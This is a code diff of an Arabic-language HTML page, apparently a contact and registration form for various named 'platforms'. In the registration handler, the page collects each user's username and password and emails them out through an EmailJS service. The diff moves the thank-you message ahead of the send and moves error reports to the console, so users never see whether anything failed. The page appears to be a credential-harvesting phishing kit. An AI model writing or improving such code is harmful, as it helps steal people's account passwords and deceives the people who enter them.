@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نموذج الاتصال</title>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // تهيئة EmailJS باستخدام Public Key الخاص بك
         (function () {
-            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل هذا بمفتاحك العام من EmailJS
+            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل بـ Public Key الخاص بك
         })();
     </script>
     <style>
@@ -113,7 +114,7 @@
             });
         });
 
-        // إرسال نموذج التواصل
+        // إرسال نموذج الاتصال
         document.getElementById('contact-form').addEventListener('submit', function (event) {
             event.preventDefault(); // منع تحديث الصفحة
 
@@ -129,20 +130,16 @@
         document.getElementById('registration-form').addEventListener('submit', function (event) {
             event.preventDefault(); // منع النموذج من تحديث الصفحة
 
-            // إرسال بيانات التسجيل عبر EmailJS
-            const platform = platformName.textContent.replace("التسجيل في ", "");
-            const formData = {
-                username: document.getElementById('username').value,
-                password: document.getElementById('password').value,
-                platform: platform
-            };
+            // محاكاة إرسال النموذج وعرض رسالة الشكر
+            formContainer.style.display = 'none';
+            thankYouMessage.style.display = 'block';
 
-            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', formData)
+            // إرسال بيانات التسجيل عبر EmailJS
+            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', this)
                 .then(function () {
-                    formContainer.style.display = 'none';
-                    thankYouMessage.style.display = 'block';
+                    console.log('تم إرسال البيانات بنجاح!');
                 }, function (error) {
-                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
+                    console.error('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
                 });
         });
     </script>
